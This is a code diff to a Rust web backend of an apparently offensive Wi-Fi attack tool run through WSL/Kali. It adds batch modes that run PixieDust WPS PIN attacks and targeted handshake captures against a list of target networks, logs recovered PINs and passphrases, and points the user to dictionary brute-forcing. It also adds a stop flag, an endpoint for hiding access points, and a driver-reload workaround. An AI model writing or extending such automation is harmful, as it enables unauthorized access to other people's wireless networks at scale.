@@ -30,6 +30,7 @@ pub struct AppState {
     pub networks: Mutex<Option<Vec<NetworkInfo>>>,
     pub iface: Mutex<Option<InterfaceState>>,
     pub summary: Mutex<Option<PipelineSummary>>,
+    pub stop: std::sync::atomic::AtomicBool,
     pub wsl_iface: Mutex<Option<String>>,
     pub wsl_adapter: Mutex<String>,
     pub wsl_aps: Mutex<Vec<Ap>>,
@@ -48,6 +49,7 @@ impl AppState {
             networks: Mutex::new(None),
             iface: Mutex::new(None),
             summary: Mutex::new(None),
+            stop: std::sync::atomic::AtomicBool::new(false),
             wsl_iface: Mutex::new(None),
             wsl_adapter: Mutex::new("未检测".into()),
             wsl_aps: Mutex::new(Vec::new()),
@@ -116,6 +118,17 @@ async fn api_wsl(State(st): State<Arc<AppState>>) -> Json<serde_json::Value> {
 }
 
 #[derive(Deserialize)]
+struct HideReq {
+    bssids: Vec<String>,
+}
+
+async fn api_wsl_hide(State(st): State<Arc<AppState>>, Json(req): Json<HideReq>) -> Json<serde_json::Value> {
+    let mut aps = st.wsl_aps.lock().unwrap();
+    aps.retain(|a| !req.bssids.iter().any(|b| b.eq_ignore_ascii_case(&a.bssid)));
+    Json(json!({ "ok": true, "remaining": aps.len() }))
+}
+
+#[derive(Deserialize)]
 struct EventsQuery {
     since: Option<u64>,
 }
@@ -166,6 +179,13 @@ async fn api_task(
                 _ => return Err((StatusCode::BAD_REQUEST, "需要 bssid/ch/essid".into())),
             };
             AppState::spawn_task(&st, "WSL定向抓包", move |s| task_wsl_capture(s, b, c, e))
+        }
+        "wsl_batch_pin" => AppState::spawn_task(&st, "WSL批量PIN", |s| task_wsl_batch(s, true)),
+        "wsl_batch_cap" => AppState::spawn_task(&st, "WSL批量抓包", |s| task_wsl_batch(s, false)),
+        "stop_batch" => {
+            st.stop.store(true, std::sync::atomic::Ordering::Relaxed);
+            events::global().push("已请求停止批量任务（当前项完成后生效）");
+            return Ok(Json(json!({ "ok": true })));
         }
         "wsl_pixie" => {
             let (b, e) = match (req.bssid.clone(), req.essid.clone()) {
@@ -272,6 +292,118 @@ fn task_full(st: Arc<AppState>) {
     match crate::pipeline::run_full(&cfg, &logs_dir, None) {
         Ok(s) => *st.summary.lock().unwrap() = Some(s),
         Err(e) => events::global().push(format!("全流程失败: {e:#}")),
+    }
+}
+
+/// Match a target SSID to a scanned AP: exact -> contains -> token.
+fn find_ap_for_target<'a>(target: &str, aps: &'a [Ap]) -> Option<&'a Ap> {
+    let t = target.to_lowercase();
+    if let Some(a) = aps.iter().find(|a| a.essid.to_lowercase() == t) {
+        return Some(a);
+    }
+    if let Some(a) = aps.iter().find(|a| a.essid.to_lowercase().contains(&t)) {
+        return Some(a);
+    }
+    let tokens: Vec<String> = regex::Regex::new(r"[-_]")
+        .unwrap()
+        .split(&t)
+        .filter(|p| p.chars().count() >= 2)
+        .map(|p| p.to_string())
+        .collect();
+    aps.iter()
+        .find(|a| tokens.iter().any(|tok| a.essid.to_lowercase().contains(tok)))
+}
+
+fn task_wsl_batch(st: Arc<AppState>, do_pin: bool) {
+    let (distro, tmo, sec) = {
+        let c = st.cfg.lock().unwrap();
+        (c.wsl.distro.clone(), c.wsl.pixie_timeout_sec, c.capture.duration_sec)
+    };
+    st.stop.store(false, std::sync::atomic::Ordering::Relaxed);
+    let Some(iface) = st.wsl_iface.lock().unwrap().clone() else {
+        events::global().push("先执行「接入网卡」");
+        return;
+    };
+    let aps = st.wsl_aps.lock().unwrap().clone();
+    let targets = st.cfg.lock().unwrap().targets.list.clone();
+    if targets.is_empty() {
+        events::global().push("目标列表为空 — 在扫描结果里点「加入」或手动输入");
+        return;
+    }
+    let mode = if do_pin {
+        format!("PixieDust（每目标超时 {tmo}s）")
+    } else {
+        format!("定向抓包（每目标 {sec}s）")
+    };
+    events::global().push(format!(
+        "批量开始：{} 个目标 x {}",
+        targets.len(),
+        mode
+    ));
+    let logs_dir = config::ensure_logs_dir();
+    let caps_abs = std::fs::canonicalize(logs_dir.join("caps"))
+        .unwrap_or_else(|_| std::path::PathBuf::from("logs/caps"));
+    let caps_win = caps_abs
+        .to_string_lossy()
+        .trim_start_matches(std::path::MAIN_SEPARATOR)
+        .trim_start_matches("?")
+        .trim_start_matches(std::path::MAIN_SEPARATOR)
+        .to_string();
+    let caps_str = if caps_win.as_bytes().get(1) == Some(&b':') {
+        format!("/mnt/{}{}", (caps_win.as_bytes()[0] as char).to_lowercase(), &caps_win[2..])
+    } else {
+        caps_win.clone()
+    };
+
+    let mut done = 0usize;
+    let mut hits = 0usize;
+    let total = targets.len();
+    for (idx, tgt) in targets.iter().enumerate() {
+        if st.stop.load(std::sync::atomic::Ordering::Relaxed) {
+            events::global().push(format!("批量中止于 {}/{}（用户停止）", idx, total));
+            break;
+        }
+        let Some(ap) = find_ap_for_target(tgt, &aps) else {
+            events::global().push(format!("  [{}/{}] {} — 扫描结果中不可见，跳过", idx + 1, total, tgt));
+            continue;
+        };
+        let ap = ap.clone();
+        events::global().push(format!(
+            "  [{}/{}] {} ({}, ch{}) …",
+            idx + 1, total, ap.essid, ap.bssid, ap.channel
+        ));
+        if do_pin {
+            match wslattack::pixie(&distro, &iface, &ap.bssid, tmo) {
+                Ok(p) => {
+                    if p.pin.is_some() {
+                        hits += 1;
+                        events::global().push(format!(
+                            "    *** 命中 {} PIN={} PSK={} ***",
+                            ap.bssid,
+                            p.pin.as_deref().unwrap_or("?"),
+                            p.psk.as_deref().unwrap_or("(无)")
+                        ));
+                    } else {
+                        events::global().push(format!("    未命中 {}", ap.bssid));
+                    }
+                    let mut all = st.pixie_out.lock().unwrap();
+                    all.retain(|x| x.bssid != p.bssid);
+                    all.push(p);
+                }
+                Err(e) => events::global().push(format!("    失败: {e:#}")),
+            }
+        } else {
+            match wslattack::capture(&distro, &iface, &ap.bssid, &ap.channel, &ap.essid, sec, &caps_str) {
+                Ok(file) => events::global().push(format!("    抓包完成 -> {file}")),
+                Err(e) => events::global().push(format!("    抓包失败: {e:#}")),
+            }
+        }
+        done += 1;
+    }
+    if do_pin {
+        events::global().push(format!("批量结束：处理 {done} 个，命中 {hits} 个"));
+    } else {
+        events::global().push(format!("批量结束：抓包 {done} 个（logs/caps/），可点「爆破」跑字典"));
     }
 }
 
@@ -400,7 +532,15 @@ fn task_wsl_attach(st: Arc<AppState>) {
         return;
     }
     std::thread::sleep(std::time::Duration::from_secs(2));
-    let Some(iface) = wslattack::find_iface(&distro) else {
+    // WSL timing race: if the module loaded after the device, the USB probe
+    // sometimes doesn't fire — reload the module once to force re-probe.
+    let mut iface = wslattack::find_iface(&distro);
+    if iface.is_none() {
+        events::global().push("接口未出现，重载驱动强制重新探测…");
+        let _ = wslattack::kali(&distro, "modprobe -r aic8800_fdrv aic_load_fw 2>/dev/null; sleep 1; modprobe aic8800_fdrv; sleep 3");
+        iface = wslattack::find_iface(&distro);
+    }
+    let Some(iface) = iface else {
         events::global().push("WSL 内未发现 wlan 接口 — 检查 lsusb / 驱动");
         *st.wsl_adapter.lock().unwrap() = wsl_adapter_summary();
         return;
@@ -507,6 +647,7 @@ fn build_router(state: Arc<AppState>) -> Router {
         .route("/api/state", get(api_state))
         .route("/api/networks", get(api_networks))
         .route("/api/wsl", get(api_wsl))
+        .route("/api/wsl/hide", post(api_wsl_hide))
         .route("/api/events", get(api_events))
         .route("/api/config", post(api_config_post))
         .route("/api/task", post(api_task))
